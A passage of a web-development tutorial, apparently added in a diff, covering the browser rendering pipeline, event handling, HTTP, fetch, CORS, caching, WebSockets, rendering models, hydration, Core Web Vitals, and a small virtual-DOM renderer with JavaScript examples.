+<h2 id="21-the-critical-rendering-path-bytes-dom-cssom-render-tree-layout-paint-composite">21. The critical rendering path: bytes → DOM → CSSOM → render tree → layout → paint → composite<a class="anchor" href="#21-the-critical-rendering-path-bytes-dom-cssom-render-tree-layout-paint-composite" aria-hidden="true">#</a></h2>
+<p>This is the pipeline every byte of HTML/CSS/JS travels through before a single pixel reaches your screen — the single most important mental model for web performance work.</p>
+<pre><code>1. PARSE HTML  →  DOM tree
+   The HTML parser is incremental and CAN be blocked by synchronous &lt;script&gt;
+   tags encountered mid-document (the parser must run and finish the script
+   before it can safely continue, since document.write() could change what
+   comes next).
+
+2. PARSE CSS   →  CSSOM tree
+   CSS parsing is render-blocking by design: no partial styles are ever
+   shown, because a rule later in the file can override one seen earlier
+   (correctness requires the whole stylesheet before computing final styles).
+
+3. DOM + CSSOM  →  RENDER TREE
+   Only visible nodes with computed styles (display:none nodes are excluded
+   entirely; visibility:hidden nodes ARE included, just invisible — this
+   distinction is why display:none saves layout cost and visibility:hidden
+   doesn't).
+
+4. RENDER TREE  →  LAYOUT (a.k.a. "reflow")
+   Computes the exact position and size of every render-tree node. Expensive:
+   changing one node's width can cascade and force recomputing its entire
+   subtree AND everything after it in document flow.
+
+5. LAYOUT  →  PAINT
+   Rasterizes: fills in pixels — text, colors, borders, shadows, images —
+   for each render-tree node, typically onto separate "layers".
+
+6. PAINT  →  COMPOSITE
+   The GPU combines the painted layers into the final frame you see,
+   applying transforms and opacity cheaply without re-painting (§22).</code></pre>
+<p><strong>Why this pipeline matters for every performance decision you make</strong>: which CSS properties you animate determines <em>how far back up this pipeline</em> the browser must re-run on every frame.</p>
+<pre><code>Changing `width`, `top`, `left`, `font-size`      -&gt; triggers LAYOUT (step 4) + PAINT + COMPOSITE
+Changing `background-color`, `box-shadow`, `color` -&gt; triggers PAINT (step 5) + COMPOSITE, skips layout
+Changing `transform`, `opacity`                     -&gt; triggers ONLY COMPOSITE (step 6)
+                                                        -&gt; can run entirely on the GPU thread,
+                                                           no main-thread JS involved on every frame</code></pre>
+<p>This is <em>the</em> reason every serious animation guideline says "animate <code>transform</code>/<code>opacity</code>, never <code>top</code>/<code>left</code>/<code>width</code>" — it's not a style preference, it's the difference between a 60fps animation running off the main thread and one that re-runs full layout on every single frame.</p>
+<pre data-lang="javascript"><code>// BAD: forces synchronous layout on every animation frame ("layout thrashing")
+function animateBad(el, targetLeft) {
+  function step() {
+    const current = parseFloat(getComputedStyle(el).left); // READ triggers layout
+    el.style.left = (current + 1) + "px";                   // WRITE invalidates layout
+    if (current &lt; targetLeft) requestAnimationFrame(step);
+  }
+  step();
+}
+
+// GOOD: composite-only, runs on the GPU, never touches layout
+function animateGood(el, targetX) {
+  el.style.transform = `translateX(${targetX}px)`;
+  el.style.transition = "transform 300ms ease-out";
+}</code></pre>
+<h2 id="22-compositing-and-the-gpu-layers-rasterization-the-16-6ms-frame-budget-jank">22. Compositing and the GPU: layers, rasterization, the 16.6ms frame budget, jank<a class="anchor" href="#22-compositing-and-the-gpu-layers-rasterization-the-16-6ms-frame-budget-jank" aria-hidden="true">#</a></h2>
+<p>At 60Hz, the browser has <strong>16.6ms</strong> to go from "something changed" to "a new frame is on screen" — miss that budget and a frame is dropped, which the human eye perceives as <strong>jank</strong> (stutter). The budget is shared:</p>
+<pre><code>16.6ms frame budget, roughly:
+  JavaScript (event handlers, your animation logic)   |
+  Style recalculation (CSSOM re-match)                 |  all on the MAIN thread
+  Layout (if triggered)                                |
+  Paint (if triggered)                                 |
+  Composite                                             — can run on a SEPARATE compositor
+                                                            thread, independent of main-thread JS</code></pre>
+<p>Elements get <strong>promoted to their own compositor layer</strong> (visible in DevTools via the "Layers" panel) when they have a <code>transform</code>/<code>opacity</code> animation, <code>will-change</code>, <code>&lt;video&gt;</code>, or a few other triggers — once promoted, the GPU can move/fade that layer independently, without asking the main thread to redo any work, which is exactly why compositor-only animations stay smooth even while the main thread is busy running your JS.</p>
+<pre data-lang="css"><code>/* Hint the browser to promote this element to its own layer BEFORE the
+   animation starts, avoiding an expensive layer-promotion mid-animation. */
+.will-animate {
+  will-change: transform;
+}</code></pre>
+<p>Overusing <code>will-change</code> is a real anti-pattern: every promoted layer costs GPU memory, and a page with hundreds of unnecessary layers can be <em>slower</em> than one with none — apply it narrowly, right before an animation starts, and remove it after.</p>
+<h2 id="23-the-event-model-capturing-bubbling-delegation-passive-listeners">23. The event model: capturing, bubbling, delegation, passive listeners<a class="anchor" href="#23-the-event-model-capturing-bubbling-delegation-passive-listeners" aria-hidden="true">#</a></h2>
+<p>DOM events travel through <strong>three phases</strong>: capturing (root → target), target, then bubbling (target → root) — this two-directional travel is what lets a listener on an ancestor react to events from descendants it doesn't even know exist yet.</p>
+<pre data-lang="javascript"><code>// listener fires during the BUBBLING phase by default (3rd arg false/omitted)
+document.body.addEventListener("click", (e) =&gt; console.log("bubble: body"));
+// listener fires during the CAPTURING phase (3rd arg true)
+document.body.addEventListener("click", (e) =&gt; console.log("capture: body"), true);
+
+// clicking a deeply nested button logs:
+// "capture: body"  (travels down first)
+// ... then any listeners on the target itself ...
+// "bubble: body"    (travels back up)</code></pre>
+<p><strong>Event delegation</strong> exploits bubbling to attach ONE listener to a container instead of one per child — critical for lists with thousands of items or items added dynamically after the listener was set up:</p>
+<pre data-lang="javascript"><code>// One listener handles clicks on ANY current or future &lt;li&gt;, no per-item binding needed
+document.querySelector("ul").addEventListener("click", (e) =&gt; {
+  const li = e.target.closest("li");
+  if (li) console.log("clicked:", li.textContent);
+});</code></pre>
+<p><strong>Passive listeners</strong> tell the browser "this listener will never call <code>preventDefault()</code>", letting the browser start scrolling immediately instead of waiting to see if your <code>touchstart</code>/<code>wheel</code> handler cancels it — a measurable, real scroll-jank fix on mobile:</p>
+<pre data-lang="javascript"><code>el.addEventListener("touchstart", handleTouch, { passive: true });</code></pre>
+<h2 id="24-mini-project-finding-and-fixing-jank-with-the-performance-panel">24. Mini project: finding and fixing jank with the Performance panel<a class="anchor" href="#24-mini-project-finding-and-fixing-jank-with-the-performance-panel" aria-hidden="true">#</a></h2>
+<p>A step-by-step diagnostic workflow (Chrome DevTools, but Firefox's Performance panel is functionally equivalent):</p>
+<ol>
+<li>Open DevTools → <strong>Performance</strong> tab → click <strong>Record</strong> → interact with the janky part of the page → <strong>Stop</strong>.</li>
+<li>Look at the <strong>frame chart</strong>: red triangles mark dropped frames.</li>
+<li>Click a slow frame and read the <strong>bottom-up/call tree</strong>: is time going to "Scripting" (your JS), "Rendering" (layout/style), or "Painting"?</li>
+<li>If "Rendering" dominates and shows repeated "Layout" entries inside a single frame — that's <strong>layout thrashing</strong> (§21's bad example): alternating reads (<code>getComputedStyle</code>, <code>.offsetHeight</code>) and writes (<code>.style.x = ...</code>) in a loop, each read forcing the browser to flush pending layout work synchronously to answer accurately.</li>
+<li>Fix: batch all reads first, then all writes:
+<pre data-lang="javascript"><code>// BAD: read, write, read, write — forces N synchronous layouts for N elements
+elements.forEach(el =&gt; {
+const h = el.offsetHeight;      // READ (forces layout flush if dirty)
+el.style.height = h * 2 + "px"; // WRITE (invalidates layout)
+});
+
+// GOOD: all reads, then all writes — ONE layout flush total
+const heights = elements.map(el =&gt; el.offsetHeight);   // all READs
+elements.forEach((el, i) =&gt; { el.style.height = heights[i] * 2 + "px"; }); // all WRITEs</code></pre>
+</li>
+</ol>
+<hr>
+<h1 id="part-iv-http-networking-and-the-browser">Part IV — HTTP, networking, and the browser<a class="anchor" href="#part-iv-http-networking-and-the-browser" aria-hidden="true">#</a></h1>
+<h2 id="25-http-fundamentals-for-js-developers">25. HTTP fundamentals for JS developers<a class="anchor" href="#25-http-fundamentals-for-js-developers" aria-hidden="true">#</a></h2>
+<p>Every <code>fetch()</code> call is an HTTP request under the hood: a method, a URL, a set of headers, and an optional body — the response mirrors that shape with a status code, headers, and a body.</p>
+<pre data-lang="javascript"><code>const res = await fetch("https://api.example.com/users/42", {
+  method: "GET",
+  headers: { "Accept": "application/json" },
+});
+res.status;        // 200
+res.ok;             // true for 200-299
+res.headers.get("content-type");
+const data = await res.json();</code></pre>
+<p>Status code classes you'll branch on constantly: <code>2xx</code> success, <code>3xx</code> redirect (handled transparently by <code>fetch</code> unless <code>redirect: "manual"</code>), <code>4xx</code> client error (your request was wrong — don't blindly retry), <code>5xx</code> server error (often safe to retry with backoff, §31).</p>
+<p>For the full HTTP/TCP/TLS mechanics underneath this — handshakes, headers, keep-alive — see <a href="../networking/tcp-ip/real-life-example.html"><code>wiki/networking/tcp-ip/real-life-example.md</code></a>; this section stays focused on what's specifically relevant from JS.</p>
+<h2 id="26-http-1-1-vs-http-2-vs-http-3-in-the-browser">26. HTTP/1.1 vs HTTP/2 vs HTTP/3 in the browser<a class="anchor" href="#26-http-1-1-vs-http-2-vs-http-3-in-the-browser" aria-hidden="true">#</a></h2>
+<p>The protocol version genuinely changes how you should write browser code:</p>
+<div class="tbl"><table>
+<thead><tr><th></th><th>Connections per origin</th><th>Multiplexing</th><th>Practical JS implication</th></tr></thead>
+<tbody>
+<tr><td>HTTP/1.1</td><td>~6 (browser-enforced cap)</td><td>None — one request per connection at a time</td><td>Firing &gt;6 concurrent <code>fetch()</code> calls to the same origin queues the rest; domain sharding (splitting assets across subdomains) was a real HTTP/1.1-era workaround</td></tr>
+<tr><td>HTTP/2</td><td>1 (all requests multiplexed over it)</td><td>Yes, many parallel streams per connection</td><td>Domain sharding actively <strong>hurts</strong> HTTP/2 (extra handshakes for no benefit) — bundle to fewer origins, not more</td></tr>
+<tr><td>HTTP/3 (QUIC/UDP)</td><td>1, but streams don't head-of-line-block each other at the transport level</td><td>Yes, independent streams</td><td>Best on lossy mobile networks — one dropped packet no longer stalls unrelated in-flight requests, unlike HTTP/2 over TCP</td></tr>
+</tbody></table></div>
+<p>Resource hints in your HTML directly influence connection setup timing:</p>
+<pre data-lang="html"><code>&lt;link rel="preconnect" href="https://api.example.com"&gt;
+
+
+&lt;link rel="dns-prefetch" href="https://cdn.example.com"&gt;
+
+
+&lt;link rel="preload" href="/fonts/main.woff2" as="font" crossorigin&gt;
+</code></pre>
+<h2 id="27-fetch-and-xmlhttprequest-requests-streaming-aborting">27. <code>fetch</code> and <code>XMLHttpRequest</code>: requests, streaming, aborting<a class="anchor" href="#27-fetch-and-xmlhttprequest-requests-streaming-aborting" aria-hidden="true">#</a></h2>
+<p><code>fetch()</code> is promise-based and the modern default; <code>XMLHttpRequest</code> (XHR) predates promises and is still relevant for <strong>upload progress events</strong>, which <code>fetch</code> didn't support natively until <code>ReadableStream</code> request bodies matured.</p>
+<pre data-lang="javascript"><code>// Aborting an in-flight fetch — critical for search-as-you-type, tab switches, etc.
+const controller = new AbortController();
+const timeoutId = setTimeout(() =&gt; controller.abort(), 5000);   // 5s timeout
+
+try {
+  const res = await fetch("/api/search?q=js", { signal: controller.signal });
+  clearTimeout(timeoutId);
+  const data = await res.json();
+} catch (err) {
+  if (err.name === "AbortError") console.log("Request timed out or was cancelled");
+  else throw err;
+}</code></pre>
+<p><strong>Streaming a response body</strong> — process data as it arrives instead of waiting for the whole payload (large JSON, NDJSON logs, LLM token streams):</p>
+<pre data-lang="javascript"><code>const res = await fetch("/api/stream");
+const reader = res.body.getReader();
+const decoder = new TextDecoder();
+
+while (true) {
+  const { done, value } = await reader.read();
+  if (done) break;
+  console.log("chunk:", decoder.decode(value, { stream: true }));
+}</code></pre>
+<h2 id="28-cors-in-depth-same-origin-policy-preflight-credentials">28. CORS in depth: same-origin policy, preflight, credentials<a class="anchor" href="#28-cors-in-depth-same-origin-policy-preflight-credentials" aria-hidden="true">#</a></h2>
+<p>The <strong>same-origin policy</strong> is the browser's foundational security boundary: scripts from <code>https://a.example.com</code> cannot read responses from <code>https://b.example.com</code> unless <code>b.example.com</code> explicitly opts in via CORS headers. "Origin" is the exact triple <code>(scheme, host, port)</code> — <code>http://</code> vs <code>https://</code>, or a different port, is a <em>different</em> origin even on the same domain.</p>
+<pre data-lang="javascript"><code>// From https://app.example.com, this request goes out on the wire regardless —
+// CORS does NOT stop the request from being SENT. It stops the BROWSER from
+// letting your JS READ the response, unless the server says it's allowed to.
+fetch("https://api.other.com/data");</code></pre>
+<p>The server must respond with <code>Access-Control-Allow-Origin: https://app.example.com</code> (or <code>*</code> for fully public APIs) or the browser blocks JS from reading the response — the response bytes did arrive over the network; CORS is enforced by the <em>browser</em>, not the server or the network, which is why CORS errors are invisible to tools like <code>curl</code>.</p>
+<p>A <strong>preflight request</strong> (<code>OPTIONS</code>) is sent automatically by the browser <em>before</em> certain requests — non-"simple" methods (<code>PUT</code>, <code>DELETE</code>, <code>PATCH</code>), or custom headers like <code>Authorization</code> — to ask the server's permission before sending the real request with credentials or a non-trivial body:</p>
+<pre><code>Browser preflight (automatic, you never write this):
+  OPTIONS /api/users/42
+  Access-Control-Request-Method: DELETE
+  Access-Control-Request-Headers: authorization
+
+Server must respond:
+  Access-Control-Allow-Origin: https://app.example.com
+  Access-Control-Allow-Methods: DELETE
+  Access-Control-Allow-Headers: authorization
+
+Only THEN does the browser send the actual DELETE request.</code></pre>
+<p>Sending cookies cross-origin requires <strong>both</strong> sides to opt in explicitly — a common source of "my auth cookie isn't being sent" bugs:</p>
+<pre data-lang="javascript"><code>fetch("https://api.example.com/me", { credentials: "include" });
+// AND the server must respond with:
+//   Access-Control-Allow-Credentials: true
+//   Access-Control-Allow-Origin: https://app.example.com   (NOT "*" — wildcard is
+//                                                             forbidden together with credentials)</code></pre>
+<h2 id="29-http-caching-and-the-browser-cache">29. HTTP caching and the browser cache<a class="anchor" href="#29-http-caching-and-the-browser-cache" aria-hidden="true">#</a></h2>
+<p><code>Cache-Control</code> response headers tell the browser (and any intermediate CDN) how long a response is reusable without asking the server again:</p>
+<pre><code>Cache-Control: max-age=31536000, immutable   // cache for a year, never revalidate
+                                              // (use for hashed filenames: app.a3f21c.js)
+Cache-Control: no-cache                       // always revalidate with the server (via ETag)
+                                              // before using the cached copy — NOT "don't cache"
+Cache-Control: no-store                       // never cache at all — for sensitive responses</code></pre>
+<p><strong>ETags</strong> enable cheap revalidation without re-downloading unchanged content: the server sends an <code>ETag</code> (a content fingerprint); on the next request the browser sends <code>If-None-Match: &lt;etag&gt;</code>; if unchanged, the server replies <code>304 Not Modified</code> with no body, saving the full download.</p>
+<pre data-lang="javascript"><code>// The browser handles this negotiation transparently for you inside fetch() —
+// you'll just see it as a 304 in the Network panel with near-zero transfer size.
+fetch("/api/data");  // second call with an unchanged resource: 304, body served from disk cache</code></pre>
+<p>Beyond the HTTP cache, the <strong>Cache API</strong> (used by service workers, §40) gives JS explicit, programmatic control over a separate cache storage — the foundation of offline-capable apps.</p>
+<h2 id="30-websockets-and-server-sent-events">30. WebSockets and Server-Sent Events<a class="anchor" href="#30-websockets-and-server-sent-events" aria-hidden="true">#</a></h2>
+<p><code>fetch</code>/XHR are request-response; two APIs exist specifically for servers pushing data without the client asking again:</p>
+<pre data-lang="javascript"><code>// WebSocket: full-duplex, both sides can send anytime, binary or text
+const ws = new WebSocket("wss://example.com/chat");
+ws.onopen = () =&gt; ws.send(JSON.stringify({ type: "join", room: "general" }));
+ws.onmessage = (event) =&gt; console.log("received:", event.data);
+ws.onclose = (event) =&gt; console.log("closed:", event.code, event.reason);
+
+// Server-Sent Events (SSE): one-directional, server -&gt; client only, plain text,
+// auto-reconnects on drop, and rides over ordinary HTTP (no protocol upgrade)
+const sse = new EventSource("/api/live-updates");
+sse.onmessage = (event) =&gt; console.log("update:", event.data);
+sse.addEventListener("price-change", (event) =&gt; console.log("price:", event.data));</code></pre>
+<p>Choose WebSockets when the client needs to send data too (chat, multiplayer, collaborative editing); choose SSE for simpler server-push-only cases (live scores, notifications) — SSE's built-in reconnection and plain-HTTP transport make it noticeably less operational overhead when bidirectionality isn't needed.</p>
+<h2 id="31-mini-project-a-resilient-fetch-client-timeout-retry-cache-dedup">31. Mini project: a resilient fetch client (timeout, retry, cache, dedup)<a class="anchor" href="#31-mini-project-a-resilient-fetch-client-timeout-retry-cache-dedup" aria-hidden="true">#</a></h2>
+<pre data-lang="javascript"><code>class ResilientClient {
+  #cache = new Map();
+  #inFlight = new Map();   // dedupe: identical concurrent requests share one promise
+
+  async get(url, { timeoutMs = 5000, retries = 2, cacheMs = 30000 } = {}) {
+    const cached = this.#cache.get(url);
+    if (cached &amp;&amp; Date.now() - cached.time &lt; cacheMs) return cached.data;
+
+    if (this.#inFlight.has(url)) return this.#inFlight.get(url);   // join the existing request
+
+    const promise = this.#fetchWithRetry(url, timeoutMs, retries)
+      .then((data) =&gt; {
+        this.#cache.set(url, { data, time: Date.now() });
+        this.#inFlight.delete(url);
+        return data;
+      })
+      .catch((err) =&gt; { this.#inFlight.delete(url); throw err; });
+
+    this.#inFlight.set(url, promise);
+    return promise;
+  }
+
+  async #fetchWithRetry(url, timeoutMs, retries) {
+    for (let attempt = 0; attempt &lt;= retries; attempt++) {
+      const controller = new AbortController();
+      const timer = setTimeout(() =&gt; controller.abort(), timeoutMs);
+      try {
+        const res = await fetch(url, { signal: controller.signal });
+        clearTimeout(timer);
+        if (!res.ok &amp;&amp; res.status &gt;= 500 &amp;&amp; attempt &lt; retries) {
+          await new Promise(r =&gt; setTimeout(r, 2 ** attempt * 200));  // exponential backoff
+          continue;
+        }
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        return res.json();
+      } catch (err) {
+        clearTimeout(timer);
+        if (attempt === retries) throw err;
+      }
+    }
+  }
+}</code></pre>
+<p>This single class demonstrates request deduplication (multiple UI components asking for the same data at once share one network call), TTL caching, per-request timeouts via <code>AbortController</code>, and retry-with-backoff limited to retriable (5xx) failures — the exact pattern behind libraries like SWR and React Query, minus the React-specific rendering integration.</p>
+<hr>
+<h1 id="part-v-rendering-web-applications-in-depth">Part V — Rendering web applications in depth<a class="anchor" href="#part-v-rendering-web-applications-in-depth" aria-hidden="true">#</a></h1>
+<h2 id="32-rendering-models-csr-ssr-ssg-isr">32. Rendering models: CSR, SSR, SSG, ISR<a class="anchor" href="#32-rendering-models-csr-ssr-ssg-isr" aria-hidden="true">#</a></h2>
+<div class="tbl"><table>
+<thead><tr><th>Model</th><th>HTML generated</th><th>First paint</th><th>SEO/no-JS</th><th>Server load</th></tr></thead>
+<tbody>
+<tr><td><strong>CSR</strong> (Client-Side Rendering)</td><td>In the browser, by JS, after download</td><td>Slow (blank until JS runs + fetches data)</td><td>Poor without extra work</td><td>Low (static file hosting)</td></tr>
+<tr><td><strong>SSR</strong> (Server-Side Rendering)</td><td>On the server, per-request</td><td>Fast (real HTML immediately)</td><td>Good</td><td>High (a server render per request)</td></tr>
+<tr><td><strong>SSG</strong> (Static Site Generation)</td><td>At build time, once</td><td>Fastest (pure static file)</td><td>Good</td><td>Lowest (CDN-served)</td></tr>
+<tr><td><strong>ISR</strong> (Incremental Static Regeneration)</td><td>At build time, then regenerated on a schedule/on-demand</td><td>Fast, can go slightly stale</td><td>Good</td><td>Low, with periodic regen cost</td></tr>
+</tbody></table></div>
+<p>A CSR page's actual load sequence explains why it "feels" slower even on a fast connection:</p>
+<pre><code>CSR:  HTML shell (empty &lt;div id="root"&gt;) -&gt; download JS bundle -&gt; execute JS
+      -&gt; JS fetches data -&gt; JS renders DOM -&gt; user sees content
+      (4 sequential round-trip-dependent steps before anything visible)
+
+SSR:  Server fetches data -&gt; server renders full HTML -&gt; browser paints
+      immediately -&gt; JS bundle arrives later and "hydrates" (§34) for
+      interactivity (1 round trip before visible content)</code></pre>
+<p>Real frameworks let you mix these per-route: Next.js/Nuxt/SvelteKit can SSR a dashboard, SSG a marketing page, and ISR a blog — the "rendering model" is a per-page decision, not an app-wide one.</p>
+<h2 id="33-virtual-dom-reconciliation-vs-fine-grained-reactivity-signals">33. Virtual DOM reconciliation vs fine-grained reactivity (signals)<a class="anchor" href="#33-virtual-dom-reconciliation-vs-fine-grained-reactivity-signals" aria-hidden="true">#</a></h2>
+<p>Two competing strategies for "when data changes, update the DOM efficiently":</p>
+<p><strong>Virtual DOM (React, Vue 2, Preact)</strong>: on every state change, re-run the component function to produce a new lightweight JS-object tree, <strong>diff</strong> it against the previous tree, and apply only the minimal set of real DOM mutations found by the diff.</p>
+<pre data-lang="javascript"><code>// Simplified idea of what a VDOM diff does conceptually
+function diff(oldVNode, newVNode) {
+  if (oldVNode.type !== newVNode.type) return replace(oldVNode, newVNode);
+  const patches = diffProps(oldVNode.props, newVNode.props);
+  const childPatches = diffChildren(oldVNode.children, newVNode.children);
+  return { patches, childPatches };   // apply only these to the REAL DOM
+}</code></pre>
+<p>Cost: re-running the whole component function and diffing is wasted work proportional to component size, even for a one-character text change — this is why <code>React.memo</code>/<code>useMemo</code>/<code>shouldComponentUpdate</code> exist, as manual escape hatches from re-running work the framework can't otherwise know is unnecessary.</p>
+<p><strong>Fine-grained reactivity (Signals — Solid, Vue 3's reactivity core, Svelte 5, Angular Signals)</strong>: instead of diffing trees, the framework tracks <em>exactly</em> which DOM nodes depend on which piece of state at setup time, so a state change updates <strong>only that specific text node or attribute</strong> directly — no diffing, no re-running unrelated code.</p>
+<pre data-lang="javascript"><code>// Solid-style signal: reading count() inside the JSX registers a fine-grained
+// dependency; updating it patches ONLY the text node that read it — nothing
+// else in the component ever re-runs.
+const [count, setCount] = createSignal(0);
+return &lt;button onClick={() =&gt; setCount(count() + 1)}&gt;Count: {count()}&lt;/button&gt;;</code></pre>
+<p>Neither is universally "faster" in every case, but signals eliminate an entire category of "why is this unrelated component re-rendering" bugs and manual-memoization boilerplate by construction — it's the direction most new frameworks (and React's own compiler work) have moved toward since ~2023.</p>
+<h2 id="34-hydration-and-partial-progressive-resumable-hydration">34. Hydration and partial/progressive/resumable hydration<a class="anchor" href="#34-hydration-and-partial-progressive-resumable-hydration" aria-hidden="true">#</a></h2>
+<p><strong>Hydration</strong> is the process of taking server-rendered static HTML and "waking it up" — attaching event listeners and internal framework state so it becomes interactive, without re-creating the DOM from scratch.</p>
+<pre><code>1. Server sends fully-formed HTML  -&gt; browser paints it immediately (fast!)
+2. Browser downloads the JS bundle  -&gt; framework re-runs the same render
+   logic client-side, comparing what IT would produce against the EXISTING
+   server-rendered DOM
+3. Framework attaches event listeners to the existing nodes instead of
+   replacing them  -&gt; page is now interactive</code></pre>
+<p>The classic cost: step 2/3 requires downloading and executing the <strong>entire</strong> JS bundle before <em>any</em> part of the page is interactive, even if the user only wants to click one button — full hydration doesn't scale well to large pages on slow devices/networks.</p>
+<p><strong>Partial hydration / islands architecture</strong> (Astro, Qwik's resumability, React Server Components) fixes this by only hydrating specific interactive "islands" (a like button, a comment form) while the rest of the page (an article body) stays pure static HTML that's never re-processed by JS at all.</p>
+<p><strong>Resumability</strong> (Qwik specifically) goes further: instead of <em>re-running</em> render logic to reconstruct state (traditional hydration), it serializes the already-computed state and event-listener wiring into the HTML itself, so the client can "resume" exactly where the server left off without re-executing any component code up front — event listeners are attached lazily, only when a user actually interacts with that specific element.</p>
+<h2 id="35-core-web-vitals-lcp-inp-cls-measuring-and-fixing-them">35. Core Web Vitals: LCP, INP, CLS — measuring and fixing them<a class="anchor" href="#35-core-web-vitals-lcp-inp-cls-measuring-and-fixing-them" aria-hidden="true">#</a></h2>
+<p>Google's Core Web Vitals are the three metrics that most directly map to perceived user experience, and are used in Search ranking:</p>
+<div class="tbl"><table>
+<thead><tr><th>Metric</th><th>Measures</th><th>Good threshold</th><th>Common fixes</th></tr></thead>
+<tbody>
+<tr><td><strong>LCP</strong> (Largest Contentful Paint)</td><td>Time until the largest visible element (usually a hero image or heading) renders</td><td>≤ 2.5s</td><td>Preload the LCP image, remove render-blocking CSS/JS, use SSR/SSG for above-the-fold content</td></tr>
+<tr><td><strong>INP</strong> (Interaction to Next Paint)</td><td>Latency from a user interaction (click/tap/keypress) to the next painted frame reflecting it</td><td>≤ 200ms</td><td>Break up long JS tasks (§37), avoid heavy synchronous work in event handlers, use <code>requestIdleCallback</code> for non-urgent work</td></tr>
+<tr><td><strong>CLS</strong> (Cumulative Layout Shift)</td><td>Unexpected layout movement after initial render</td><td>≤ 0.1</td><td>Always set explicit <code>width</code>/<code>height</code> on images/embeds, reserve space for ads/late-loading content, avoid inserting content above existing content</td></tr>
+</tbody></table></div>
+<p>Measuring them in real user sessions (not just synthetic lab tests) via the <code>web-vitals</code> library:</p>
+<pre data-lang="javascript"><code>import { onLCP, onINP, onCLS } from "web-vitals";
+
+onLCP((metric) =&gt; sendToAnalytics("LCP", metric.value));
+onINP((metric) =&gt; sendToAnalytics("INP", metric.value));
+onCLS((metric) =&gt; sendToAnalytics("CLS", metric.value));</code></pre>
+<p>Diagnosing a long task that hurts INP with the <code>PerformanceObserver</code> API directly (no library needed):</p>
+<pre data-lang="javascript"><code>new PerformanceObserver((list) =&gt; {
+  for (const entry of list.getEntries()) {
+    if (entry.duration &gt; 50) {   // "long task" threshold per the spec
+      console.warn(`Long task: ${entry.duration.toFixed(1)}ms`, entry);
+    }
+  }
+}).observe({ type: "longtask", buffered: true });</code></pre>
+<h2 id="36-mini-project-a-virtual-dom-renderer-from-scratch-150-lines">36. Mini project: a virtual-DOM renderer from scratch (~150 lines)<a class="anchor" href="#36-mini-project-a-virtual-dom-renderer-from-scratch-150-lines" aria-hidden="true">#</a></h2>
+<p>A minimal illustration of §33's VDOM diffing concept, enough to actually run:</p>
+<pre data-lang="javascript"><code>// vdom.js — a tiny virtual DOM: h() creates nodes, render() diffs and patches
+
+function h(type, props, ...children) {
+  return { type, props: props || {}, children: children.flat() };
+}
+
+function createRealNode(vnode) {
+  if (typeof vnode === "string" || typeof vnode === "number") {
+    return document.createTextNode(String(vnode));
+  }
+  const el = document.createElement(vnode.type);
+  for (const [key, value] of Object.entries(vnode.props)) {
+    if (key.startsWith("on")) el.addEventListener(key.slice(2).toLowerCase(), value);
+    else el.setAttribute(key, value);
+  }
+  vnode.children.forEach((child) =&gt; el.appendChild(createRealNode(child)));
+  vnode.dom = el;
+  return el;
+}
+
+function diff(oldVNode, newVNode) {
+  if (oldVNode === undefined) return { type: "CREATE", newVNode };
+  if (newVNode === undefined) return { type: "REMOVE" };
+  if (typeof oldVNode !== typeof newVNode ||
+      (typeof oldVNode === "object" &amp;&amp; oldVNode.type !== newVNode.type)) {
+    return { type: "REPLACE", newVNode };
+  }
+  if (typeof newVNode === "string" || typeof newVNode === "number") {
+    return oldVNode !== newVNode ? { type: "TEXT", newVNode } : { type: "NONE" };
+  }
+  return {
+    type: "UPDATE",
+    propPatches: diffProps(oldVNode.props, newVNode.props),
+    childPatches: diffChildren(oldVNode.children, newVNode.children),
+    oldVNode, newVNode,
+  };
+}
+
+function diffProps(oldProps, newProps) {
+  const patches = [];
+  for (const key of Object.keys(newProps)) {
+    if (oldProps[key] !== newProps[key]) patches.push({ key, value: newProps[key] });
+  }
+  for (const key of Object.keys(oldProps)) {
+    if (!(key in newProps)) patches.push({ key, value: null });   // removed
+  }
+  return patches;
+}
+
+function diffChildren(oldChildren, newChildren) {
+  const max = Math.max(oldChildren.length, newChildren.length);
+  const patches = [];
+  for (let i = 0; i &lt; max; i++) patches.push(diff(oldChildren[i], newChildren[i]));
+  return patches;
+}
+
+function patch(parentDom, patchObj, index = 0) {
+  const existing = parentDom.childNodes[index];
+  switch (patchObj.type) {
+    case "CREATE":
+      parentDom.appendChild(createRealNode(patchObj.newVNode));
+      break;
+    case "REMOVE":
+      if (existing) parentDom.removeChild(existing);
+      break;
+    case "REPLACE":
+      parentDom.replaceChild(createRealNode(patchObj.newVNode), existing);
+      break;
+    case "TEXT":
+      existing.textContent = patchObj.newVNode;
+      break;
+    case "UPDATE": {
+      const dom = patchObj.oldVNode.dom;
+      patchObj.oldVNode.newVNode = patchObj.newVNode;
+      patchObj.newVNode.dom = dom;
+      for (const { key, value } of patchObj.propPatches) {
+        if (value === null) dom.removeAttribute(key);
+        else dom.setAttribute(key, value);
+      }
+      patchObj.childPatches.forEach((childPatch, i) =&gt; patch(dom, childPatch, i));
+      break;
+    }
+    // "NONE": nothing changed, skip entirely — this is the whole point of diffing
+  }
+}
+
+// --- usage ---
+let currentVNode;
+function render(vnode, container) {
+  const patchObj = diff(currentVNode, vnode);
+  patch(container, currentVNode === undefined ? { type: "CREATE", newVNode: vnode } : patchObj);
+  currentVNode = vnode;
+}
+
+let count = 0;
+function view() {
+  return h("div", {},
+    h("h1", {}, `Count: ${count}`),
+    h("button", { onClick: () =&gt; { count++; render(view(), document.getElementById("app")); } },
+      "Increment"),
+  );
+}
+render(view(), document.getElementById("app"));</code></pre>
+<p>Running this and clicking "Increment" repeatedly, then inspecting the DOM in DevTools, shows the <code>&lt;h1&gt;</code>'s text node updates in place on every click while the <code>&lt;button&gt;</code> element itself is never recreated — exactly the "diff, then patch only what changed" behavior §33 described in the abstract.</p>
+<hr>
+<h1 id="part-vi-advanced-js-concurrency-and-multi-threaded-browser-apps">Part VI — Advanced JS: concurrency and multi-threaded browser apps<a class="anchor" href="#part-vi-advanced-js-concurrency-and-multi-threaded-browser-apps" aria-hidden="true">#</a></h1>
+<h2 id="37-why-js-is-mostly-single-threaded-and-what-that-really-means">37. Why JS is (mostly) single-threaded, and what that really means<a class="anchor" href="#37-why-js-is-mostly-single-threaded-and-what-that-really-means" aria-hidden="true">#</a></h2>
+<p>The precise claim is: <strong>each JS realm (roughly: each tab, or each worker) has exactly one thread executing its JS</strong>, not "the browser has one thread total." A page with 3 Web Workers genuinely has 4 independent JS threads running concurrently — the main thread and each worker's own thread, each with its own call stack, its own event loop, and (critically) <strong>no shared memory by default</strong> — communication only happens via message-passing (§38).</p>
